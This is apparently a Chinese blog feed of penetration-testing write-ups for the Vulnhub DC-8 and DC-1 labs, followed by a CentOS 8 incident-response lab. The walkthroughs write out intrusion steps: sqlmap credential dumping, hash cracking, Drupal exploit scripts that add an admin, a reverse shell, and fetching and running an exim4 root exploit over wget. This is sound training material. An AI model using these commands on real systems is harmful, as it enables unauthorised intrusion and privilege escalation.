title="3、web漏洞探测"></a>3、web漏洞探测</h3><p>访问一下web目录</p><p><img src="/img/Vulnhub-DC-8/image-20240203172515316.png" alt="image-20240203172515316"></p><p>在kali中用whatweb 识别web框架</p><p><img src="/img/Vulnhub-DC-8/image-20240203172733990.png" alt="image-20240203172733990"></p><p>有关Drupal 7 的相关漏洞有很多现成的利用方式，可用searchsploit 进行搜索。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd Drupal 7</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203172935465.png" alt="image-20240203172935465"></p><p>但是利用方式分具体的版本信息，我们暂时还不知道版本的信息。</p><h3 id="4、web目录探测"><a href="#4、web目录探测" class="headerlink" title="4、web目录探测"></a>4、web目录探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.58 -x 404,403#过滤掉404，403的响应</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174337667.png" alt="image-20240203174337667"></p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、查看敏感目录文件"><a href="#1、查看敏感目录文件" class="headerlink" title="1、查看敏感目录文件"></a>1、查看敏感目录文件</h3><p>1、robots.txt文件：并没有太多有用的信息，只给了一些目录及文件。</p><p><img src="/img/Vulnhub-DC-8/image-20240203174733596.png" alt="image-20240203174733596"></p><p>2、install.php文件：看名字是一个安装文件，有重装网站的风险，但是依然无用。</p><p>提示要么在数据库中删除现有的数据库信息，要么在settings.php 文件中重新配置成新的数据库。</p><p><img src="/img/Vulnhub-DC-8/image-20240203174944771.png" alt="image-20240203174944771"></p><p>3、web.config文件：在源代码中看到在首页index.php文件有一个q的参数接口。</p><p><img src="/img/Vulnhub-DC-8/image-20240203175425156.png" alt="image-20240203175425156"></p><p><img src="/img/Vulnhub-DC-8/image-20240203175515852.png" alt="image-20240203175515852"></p><p><img src="/img/Vulnhub-DC-8/image-20240203175532328.png" alt="image-20240203175532328"></p><p>在几次的尝试之后发现是一个指路的参数。</p><p>4、xmlrpc.php文件：一个奇怪的文件名，查看是一个xml-rpc服务，且需要post提交</p><p><img src="/img/Vulnhub-DC-8/image-20240203180428347.png" alt="image-20240203180428347"></p><p>用HackBar 简单的进行一个post提交，提示格式不正确，感觉可能存在xml注入。</p><p><img src="/img/Vulnhub-DC-8/image-20240203180522820.png" alt="image-20240203180522820"></p><p>上网搜索有关xml-rpc服务相关的漏洞，确实有很多相关漏洞，后面可以再自行研究。</p><h3 id="2、发现SQL注入"><a href="#2、发现SQL注入" class="headerlink" title="2、发现SQL注入"></a>2、发现SQL注入</h3><p>我们点击左侧一篇文章之后，发现上方有一个有一个参数nid</p><p><img src="/img/Vulnhub-DC-8/image-20240203182054064.png" alt="image-20240203182054064"></p><p>在加上一个单引号’ 之后出现报错，SQL注入的典型特征</p><p><img src="/img/Vulnhub-DC-8/image-20240203182157797.png" alt="image-20240203182157797"></p><p>为了加快速度，我们直接用sqlmap 去跑，很快出现了结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u &quot;http://192.168.31.58/?nid=1&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203182330160.png" alt="image-20240203182330160"></p><p>之后一步步去爆破数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u &quot;http://192.168.31.58/?nid=1&quot; --batch -D d7db -T users -C uid,main,name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203185524761.png" alt="image-20240203185524761"></p><p>爆破出来两个账户，密码经过了加密。</p><h3 id="3、登录后台"><a href="#3、登录后台" class="headerlink" title="3、登录后台"></a>3、登录后台</h3><p>将账号密码保存下来，用john 破解工具破解账号密码。</p><p><img src="/img/Vulnhub-DC-8/image-20240203190028515.png" alt="image-20240203190028515"></p><p>john账号的密码很快就能破解出来</p><p><img src="/img/Vulnhub-DC-8/image-20240203190132333.png" alt="image-20240203190132333"></p><p>那我们先登录john 的账号（在之前的web目录扫描中知道登录的后台地址&#x2F;user&#x2F;login）</p><p><img src="/img/Vulnhub-DC-8/image-20240203190525466.png" alt="image-20240203190525466"></p><p>成功登录后台。</p><h3 id="4、反弹shell"><a href="#4、反弹shell" class="headerlink" title="4、反弹shell"></a>4、反弹shell</h3><p>在Drupal 后台中有一个可以执行php代码的地方，是这个框架的一个必须的检测点。</p><p>在如下的这个地方：</p><p><img src="/img/Vulnhub-DC-8/image-20240203190705884.png" alt="image-20240203190705884"></p><p>如下切换成php代码。是一个提交意见之后的感谢语。</p><p><img src="/img/Vulnhub-DC-8/image-20240203190749203.png" alt="image-20240203190749203"></p><p>在我们的shell反弹网站中找一个phpshell反弹的代码，粘贴上去后在下方保存，并监听本地的4444端口。</p><p><img src="/img/Vulnhub-DC-8/image-20240203190947064.png" alt="image-20240203190947064"></p><p><img src="/img/Vulnhub-DC-8/image-20240203191049849.png" alt="image-20240203191049849"></p><p>之后返回，去写一个意见提交，拿到shell。</p><p><img src="/img/Vulnhub-DC-8/image-20240203191205010.png" alt="image-20240203191205010"></p><p>这里如果失败可以多试几次，退出登录、刷新页面等（最好在一个页面上操作）</p><p><img src="/img/Vulnhub-DC-8/image-20240203192429966.png" alt="image-20240203192429966"></p><h1 id="四、提权至root"><a href="#四、提权至root" class="headerlink" title="四、提权至root"></a>四、提权至root</h1><h3 id="1、查找SUID文件"><a href="#1、查找SUID文件" class="headerlink" title="1、查找SUID文件"></a>1、查找SUID文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203192842506.png" alt="image-20240203192842506"></p><p>可以看到exim4，低版本的exim4是可以提权的。</p><p>查看exim4的版本信息：4.89确认在可提权的版本范围内。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203193259469.png" alt="image-20240203193259469"></p><h3 id="2、exim4提权"><a href="#2、exim4提权" class="headerlink" title="2、exim4提权"></a>2、exim4提权</h3><p>1、查找可本地提权脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd exim 4 | findstr Local#通过findstr Local进行筛选</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203193518182.png" alt="image-20240203193518182"></p><p>2、查看脚本的利用方式</p><p>我们可以在右侧找到searchsploit这个工具，双击进去它的目录，找到这个脚本并复制出来。</p><p><img src="/img/Vulnhub-DC-8/image-20240204142529937.png" alt="image-20240204142529937"></p><p><img src="/img/Vulnhub-DC-8/image-20240204142649690.png" alt="image-20240204142649690"></p><p>进行复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploits/linux/local/46996.sh /c/Users/Administrator/Desktop/test/</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240204142735747.png" alt="image-20240204142735747"></p><p>回到windows中用sublime来打开该脚本</p><p><img src="/img/Vulnhub-DC-8/image-20240203193852694.png" alt="image-20240203193852694"></p><p>3、解析该脚本</p><p>如果不懂sh脚本的代码，可以直接让gpt进行分析</p><p><img src="/img/Vulnhub-DC-8/image-20240203194141404.png" alt="image-20240203194141404"></p><p>简而言之，该脚本有两个利用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m setuid</span><br><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><h3 id="3、提权至root"><a href="#3、提权至root" class="headerlink" title="3、提权至root"></a>3、提权至root</h3><p>1、将该脚本上传至靶机，本地开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>2、在靶机的&#x2F;tmp 目录下进行下载，&#x2F;tmp目录任何人都有下载执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.50:8000/46996.sh</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203194428286.png" alt="image-20240203194428286"></p><p>3、给该脚本执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>4、执行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat#提权成功</span><br><span class="line">shell=/bin/bash script -q /dev/null#进入交互shell</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203194645289.png" alt="image-20240203194645289"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_DC-1</title>
      <link href="/2024/02/15/Vulnhub-DC-1/"/>
      <url>/2024/02/15/Vulnhub-DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-DC-1靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-DC-1靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_DC-1靶场渗透"></a>【Vulnhub系列靶场】Vulnhub_DC-1靶场渗透</h1><h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1、在百度网盘中下载DC-1靶场。DC-1靶场受virtual box 的影响，在VM中直接打开是扫描不到IP 的，我们需要先解决这个问题：<a href="/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/" title="【其他经验】Vulnhub靶机扫描不到IP">【其他经验】Vulnhub靶机扫描不到IP</a></p><p>2、之后在VM中打开.ovf 文件，设置存储路径和任意名称</p><p>3、开机之后修改网络连接模式为【NAT】即可</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215190004853.png" alt="image-20240215190004853"></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p>1、粗略快速探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215190129699.png" alt="image-20240215190129699"></p><p>2、精细化扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.64</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215193134231.png" alt="image-20240215193134231"></p><p><img src="/img/Vulnhub-DC-1/image-20240215193153578.png" alt="image-20240215193153578"></p><p>3、全扫描和漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80,111,45384,46146 192.168.31.64</span><br><span class="line">nmap.exe --script=vuln -p22,80,111,45384,46146 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215193925495.png" alt="image-20240215193925495"></p><p>Debian 操作系统</p><p><img src="/img/Vulnhub-DC-1/image-20240215194229531.png" alt="image-20240215194229531"></p><p> 80端口发现：cve2014-3704漏洞、csrf 和一些敏感路径</p><h3 id="3、web目录探测"><a href="#3、web目录探测" class="headerlink" title="3、web目录探测"></a>3、web目录探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.64 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215195553109.png" alt="image-20240215195553109"></p><h3 id="4、web框架探测"><a href="#4、web框架探测" class="headerlink" title="4、web框架探测"></a>4、web框架探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.64#在kali中使用</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215200000848.png" alt="image-20240215200000848"></p><p>使用了Drupal 7的框架</p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、cve2014-3704-SQL注入"><a href="#1、cve2014-3704-SQL注入" class="headerlink" title="1、cve2014-3704 SQL注入"></a>1、cve2014-3704 SQL注入</h3><p>访问网站，确实是一个Drupal 7 框架的网站</p><p><img src="/img/Vulnhub-DC-1/image-20240215200945203.png" alt="image-20240215200945203"></p><p>根据nmap 探测出来的cve2014-3704 ，在漏洞库中进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响：Drupal 7.0~7.31</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215201224514.png" alt="image-20240215201224514"></p><p>我们直接将这个数据包进行保存，修改Host 为靶机地址，抓包重放</p><p><img src="/img/Vulnhub-DC-1/image-20240215204441344.png" alt="image-20240215204441344"></p><p>利用成功，存在SQL注入</p><h3 id="2、登录后台"><a href="#2、登录后台" class="headerlink" title="2、登录后台"></a>2、登录后台</h3><p>我们利用这个SQL漏洞进行手工注入太过于麻烦，我们去searchsploit 上搜索有关Drupal 7 的相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd Drupal 7</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215212739190.png" alt="image-20240215212739190"></p><p>有四个符合版本信息，挨个尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploits/php/webapps/34992.py /c/Users/Administrator/Desktop/test/</span><br></pre></td></tr></table></figure><p>1、第一个是直接添加一个管理员用户的py脚本：34992.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 34992.py -t http://192.168.31.64 -u admin123 -p admin123</span><br><span class="line">#添加一个账号密码均为admin123的管理员</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215212853269.png" alt="image-20240215212853269"></p><p><img src="/img/Vulnhub-DC-1/image-20240215213029437.png" alt="image-20240215213029437"></p><p>用<code>admin123:admin123</code>登录后台</p><p><img src="/img/Vulnhub-DC-1/image-20240215213315976.png" alt="image-20240215213315976"></p><p>IP被加入黑名单了，我说怎么登录不了，我们稍等片刻。之后换了<code>admin1234:admin1234</code>，提示账号未激活不能使用。</p><p><img src="/img/Vulnhub-DC-1/image-20240216184714618.png" alt="image-20240216184714618"></p><p>2、我们尝试第四个php脚本：34993.php</p><p>修改我们的靶机地址</p><p><img src="/img/Vulnhub-DC-1/image-20240216194806747.png" alt="image-20240216194806747"></p><p>之后执行</p><p><img src="/img/Vulnhub-DC-1/image-20240216194833054.png" alt="image-20240216194833054"></p><p>之后用<code>admin:admin</code>进行登录</p><p><img src="/img/Vulnhub-DC-1/image-20240216195221938.png" alt="image-20240216195221938"></p><p>成功登录后台</p><h3 id="3、获取shell立足点"><a href="#3、获取shell立足点" class="headerlink" title="3、获取shell立足点"></a>3、获取shell立足点</h3><p>在后台模块中开启PHP代码</p><p><img src="/img/Vulnhub-DC-1/image-20240216201525764.png" alt="image-20240216201525764"></p><p>进行保存，提示成功</p><p><img src="/img/Vulnhub-DC-1/image-20240216201653827.png" alt="image-20240216201653827"></p><p>我们随便找一篇文章进行修改</p><p><img src="/img/Vulnhub-DC-1/image-20240216201907601.png" alt="image-20240216201907601"></p><p>选择PHP代码</p><p><img src="/img/Vulnhub-DC-1/image-20240216201934513.png" alt="image-20240216201934513"></p><p>添加上PHP反弹shell代码</p><p><img src="/img/Vulnhub-DC-1/image-20240216202351688.png" alt="image-20240216202351688"></p><p>用nc 成功接收到shell</p><p><img src="/img/Vulnhub-DC-1/image-20240216202503815.png" alt="image-20240216202503815"></p><h1 id="四、提权至root"><a href="#四、提权至root" class="headerlink" title="四、提权至root"></a>四、提权至root</h1><h3 id="1、敏感信息收集"><a href="#1、敏感信息收集" class="headerlink" title="1、敏感信息收集"></a>1、敏感信息收集</h3><p>1、www下的sites&#x2F;default&#x2F;settings.php 数据库配置文件</p><p>drupaldb数据库的账号密码：dbuser:R0ck3t</p><p><img src="/img/Vulnhub-DC-1/image-20240216203650477.png" alt="image-20240216203650477"></p><p>2、&#x2F;etc&#x2F;passwd 文件</p><p>存在flag4 这个用户</p><p><img src="/img/Vulnhub-DC-1/image-20240216204206491.png" alt="image-20240216204206491"></p><p>3、flag4.txt 文件</p><p><img src="/img/Vulnhub-DC-1/image-20240216204341256.png" alt="image-20240216204341256"></p><h3 id="2、find高权限提权"><a href="#2、find高权限提权" class="headerlink" title="2、find高权限提权"></a>2、find高权限提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查找高权限命令</p><p><img src="/img/Vulnhub-DC-1/image-20240216205000230.png" alt="image-20240216205000230"></p><h3 id="3、提权至root"><a href="#3、提权至root" class="headerlink" title="3、提权至root"></a>3、提权至root</h3><p>采用find 进行提权，成功拿到root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240216205312662.png" alt="image-20240216205312662"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】Centos8入侵排查、响应加固</title>
      <link href="/2024/02/15/Emergency-Centos8/"/>
      <url>/2024/02/15/Emergency-Centos8/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos8-爆破、后门、命令替换事例"><a href="#Centos8-爆破、后门、命令替换事例" class="headerlink" title="Centos8 爆破、后门、命令替换事例"></a>Centos8 爆破、后门、命令替换事例</h1><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><ol><li><p>在百度网盘下载Centos8应急响应靶机并在vm打开。首先获取靶机的所有权</p><p><img src="/img/Emergency-Centos8/image-20240127133316802.png" alt="image-20240127133316802"></p></li><li><p>之后运行靶机并选择已经复制靶机，之后选择放弃，这是因为没有对应的iso文件造成的。</p><p><img src="/img/Emergency-Centos8/image-20240127133448284.png" alt="image-20240127133448284"></p></li><li><p>之后重新运行靶机即可。</p><p><img src="/img/Emergency-Centos8/image-20240127133553758.png" alt="image-20240127133553758"></p></li><li><p>以zyr 用户的权限进入，密码123456</p></li></ol><h1 id="二、入侵排查"><a href="#二、入侵排查" class="headerlink" title="二、入侵排查"></a>二、入侵排查</h1><h3 id="1、网络排查"><a href="#1、网络排查" class="headerlink" title="1、网络排查"></a>1、网络排查</h3><p>当我们确定该机器已经被入侵之后，通常先看一下网络连接情况，切断机器与外界的网络连接，防止危害继续扩大。</p><p>我们在centos8左上角的活动调用终端，输入以下命令进行查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127134155940.png" alt="image-20240127134155940"></p><p>目前因为只有这台受害靶机，没有入侵靶机，所以这里并不存在靶机与攻击机建立的端口连接。如果有连接的话我们可以通过 <code>kill</code> 命令切断端口连接，还可以用 <code>lsof -p &lt;PID&gt;</code> 查看到端口连接的进程应用程序，对恶意程序进行取证。</p><h3 id="2、后门用户排查"><a href="#2、后门用户排查" class="headerlink" title="2、后门用户排查"></a>2、后门用户排查</h3><p>先通过<code>who</code>命令查看一下当前靶机上登陆的用户<img src="/img/Emergency-Centos8/image-20240127135323093.png" alt="image-20240127135323093"></p><p>只有tty 本地登陆的的zyr 用户，确认并无他人在登陆该机器。</p><p>简单的看一下 <code>/etc/passwd</code> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">awk -F: &#x27;$3==0 &#123;print$1&#125;&#x27; /etc/passwd#查看uid权限为0的特权用户</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127135642183.png" alt="image-20240127135642183"></p><p>发现除了root之外还有一个 wxiaoge 的特权用户，我们再看一下<code>/etc/shadow</code>文件中能正常登陆的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127140522749.png" alt="image-20240127140522749"></p><p>可以看到wxiaoge 这个用户也是可以正常登录的。一般这个时候需要与客户进行沟通，确认wxiaoge 是恶意用户。</p><p>确认wxiaoge 是恶意用户之后，我们对该用户进行封禁，使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -L wxiaoge &amp;&amp; sudo usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127141234111.png" alt="image-20240127141234111"></p><p>也可以对该用户进行删除，直接编辑 <code>passwd 和 shadow</code>文件即可。</p><h3 id="3、计划任务排查"><a href="#3、计划任务排查" class="headerlink" title="3、计划任务排查"></a>3、计划任务排查</h3><p>少了历史命令排查，但是我们通过查看<code>history</code>和普通用户家目录下的 <code>.bash_history</code>可以发现，历史命令都已经被清空，同时wxiaoge 并无家目录，只能作罢。</p><p>先查看一下计划任务列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127142109610.png" alt="image-20240127142109610"></p><p>可以看到普通用户zyr 并没有计划任务，而root 用户存在一个每分每秒都会去运行的 .elf 文件，这个文件的名称也非常醒目，大概率是恶意文件。</p><p><img src="/img/Emergency-Centos8/image-20240127142313290.png" alt="image-20240127142313290"></p><p>先简单的看一下该文件的信息，是一个755的可执行文件。</p><p><img src="/img/Emergency-Centos8/image-20240127143425348.png" alt="image-20240127143425348"></p><p>可以将此文件放在<code>沙箱</code>中进行排查，确认是恶意文件。保留取证，后期可以在安全的环境下试着运行此恶意文件，观察网络环境等进行溯源。</p><p>我们使用<code>crontab -e</code>对计划任务进行编辑，或者使用<code>crontab -r</code>删除所有用户计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>删除恶意的计划任务。</p><p><img src="/img/Emergency-Centos8/image-20240127143118099.png" alt="image-20240127143118099"></p><h3 id="4、命令替换排查"><a href="#4、命令替换排查" class="headerlink" title="4、命令替换排查"></a>4、命令替换排查</h3><p>我们可以先看一下环境变量的路径都有哪些</p><p><img src="/img/Emergency-Centos8/image-20240127143645212.png" alt="image-20240127143645212"></p><p>然后采用<code>rpm </code>命令逐个排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf /sbin/*</span><br><span class="line"></span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127144154476.png" alt="image-20240127144154476"></p><p><img src="/img/Emergency-Centos8/image-20240127144219519.png" alt="image-20240127144219519"></p><p>一些其他文件改变的话是无可厚非的，主要查看一些关键性命令的改变。</p><p>ps命令疑似被改变。试着查看一下ps命令的内容：<img src="/img/Emergency-Centos8/image-20240127144528505.png" alt="image-20240127144528505"></p><p>只有一行命令，还是很好解释的，去执行了一个 .elf 文件 和 一个隐藏文件下的ps 命令并进行了过滤。</p><p>将这两个文件放在沙箱中进行排查，.elf 是后门文件，进行取证后期溯源，而ps 是无毒文件。</p><p>试着执行该隐藏的ps文件。是被隐藏起来的正常的ps文件<img src="/img/Emergency-Centos8/image-20240127145306386.png" alt="image-20240127145306386"></p><p>将其恢复原位，并将恶意的ps杀掉</p><p><img src="/img/Emergency-Centos8/image-20240127145456777.png" alt="image-20240127145456777"></p><h3 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h3><p>1、后门文件 ：&#x2F;root&#x2F;shell.elf 、&#x2F;centos_core.elf<br>2、后门账户：wxiaoge<br>3、找到恶意定时任务<br>4、ps命令被替留ps命令后门</p><h1 id="三、溯源加固"><a href="#三、溯源加固" class="headerlink" title="三、溯源加固"></a>三、溯源加固</h1><h3 id="1、查看入侵途径"><a href="#1、查看入侵途径" class="headerlink" title="1、查看入侵途径"></a>1、查看入侵途径</h3><p>看一下开放端口</p><p><img src="/img/Emergency-Centos8/image-20240127151217562.png" alt="image-20240127151217562"></p><p>此时该机器处于关闭状态，并没有有用的端口开放。检查用户登陆日志<code>/var/log/secure</code></p><p><img src="/img/Emergency-Centos8/image-20240127152050666.png" alt="image-20240127152050666"></p><p>依据该文件大小，是存在大量日志的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure | grep password#简单过滤查看一下</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127152226439.png" alt="image-20240127152226439"></p><p>存在成功日志，指向 192.168.226.1 这个IP，而我本机的IP是192.168.122.1</p><p>对登陆成功的IP进行排序统计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Accepted password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127152726462.png" alt="image-20240127152726462"></p><p>该IP有5次成功登陆次数，878 次失败登陆次数。</p><p>再查看一下爆破的时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted password for root&quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127153202604.png" alt="image-20240127153202604"></p><p><img src="/img/Emergency-Centos8/image-20240127153223482.png" alt="image-20240127153223482"></p><p>可以看到 192.168.226.1 这个IP从21:51:32 开始爆破到21:58:31 一直处于爆破状态，21:57:56爆破成功。</p><h3 id="2、攻击路径还原"><a href="#2、攻击路径还原" class="headerlink" title="2、攻击路径还原"></a>2、攻击路径还原</h3><p>1、192.168.226.1 在21:57:56爆破成功，22:00:27登陆靶机，之后根据入侵排查出来的东西进行还原。</p><p>2、shell.elf 在00:51:12的时候进行了投放</p><p><img src="/img/Emergency-Centos8/image-20240127153702528.png" alt="image-20240127153702528"></p><p>3、计划任务在 01:05:53 的时候建立</p><p><img src="/img/Emergency-Centos8/image-20240127154108391.png" alt="image-20240127154108391"></p><p>4、centos_core.elf 在00:57:03 的时候投放</p><p><img src="/img/Emergency-Centos8/image-20240127154226236.png" alt="image-20240127154226236"></p><p>5、ps文件在 00:59:45 进行了改动</p><p><img src="/img/Emergency-Centos8/image-20240127154418317.png" alt="image-20240127154418317"></p><p>6、后门用户wxiaoge  在22:01:18的时候创建</p><p><img src="/img/Emergency-Centos8/image-20240127154614968.png" 